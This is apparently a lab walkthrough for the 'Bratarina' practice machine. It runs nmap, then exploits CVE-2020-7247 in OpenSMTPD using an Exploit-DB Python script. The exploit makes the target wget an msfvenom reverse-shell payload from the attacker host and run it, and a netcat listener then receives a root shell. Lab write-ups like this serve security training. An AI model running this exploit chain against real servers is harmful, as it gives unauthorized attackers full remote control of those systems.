Exploitation Guide for Bratarina
Summary

We will exploit an an OpenSMTP vulnerability on this machine.
Enumeration
Nmap

We’ll start off with an nmap scan.

kali@kali:~$ sudo nmap 192.168.135.71
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 12:39 +03
Nmap scan report for 192.168.135.71
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds

Detailed Nmap Scan

There are a few interesting services. Let’s run a deeper enumeration on the open ports to obtain service version information.

kali@kali:~$ sudo nmap 192.168.135.71 -A -p 22,25,80,443
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 12:39 +03
Nmap scan report for 192.168.135.71
Host is up (0.15s latency).

PORT    STATE    SERVICE VERSION
22/tcp  open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open     smtp    OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.135], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)
80/tcp  open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
443/tcp filtered https
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 - 5.6 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 25/tcp)
HOP RTT       ADDRESS
1   147.21 ms 192.168.49.1
2   147.34 ms 192.168.135.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.39 seconds

Exploitation

The OpenSMTP, HTTP and SAMBA services appear to be viable attack vectors. Let’s use searchsploit to search for exploits, beginning with OpenSMTP.

kali@kali:~$ searchsploit opensmtp
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                                    | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                                                | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                                                | openbsd/remote/48051.pl
OpenSMTPD 6.6.2 - Remote Code Execution                                                                                                                                     | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                                       | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                                    | openbsd/remote/48140.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

We could attempt each of these exploits but 47984 (a Python exploit) seems promising.

kali@kali:~$ searchsploit -x linux/remote/47984.py


# Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
#
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)
[SNIP]

To leverage this, we’ll need to first create a reverse shell payload and host it on our Kali machine.

kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Next we’ll copy the exploit to a working directory.

kali@kali:~$ searchsploit -m 47984
  Exploit: OpenSMTPD 6.6.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/47984.py

Let’s run the exploit to download our payload to the target.

kali@kali:~$ python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
kali@kali:~$ python3 47984.py 192.168.135.71 25 'chmod +x /tmp/shell'

[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

Finally, we’ll start a netcat listener and run the exploit one last time to obtain a reverse shell.

kali@kali:~$ python3 47984.py 192.168.135.71 25 '/tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
192.168.135.71: inverse host lookup failed: Unknown host
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.71] 54626
ifconfig -a && hostname && whoami
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.135.71  netmask 255.255.255.0  broadcast 192.168.135.255
        ether 00:50:56:bf:c7:95  txqueuelen 1000  (Ethernet)
        RX packets 2689  bytes 180034 (180.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1111  bytes 301967 (301.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2998  bytes 653581 (653.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2998  bytes 653581 (653.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bratarina
root

This grants us a root shell.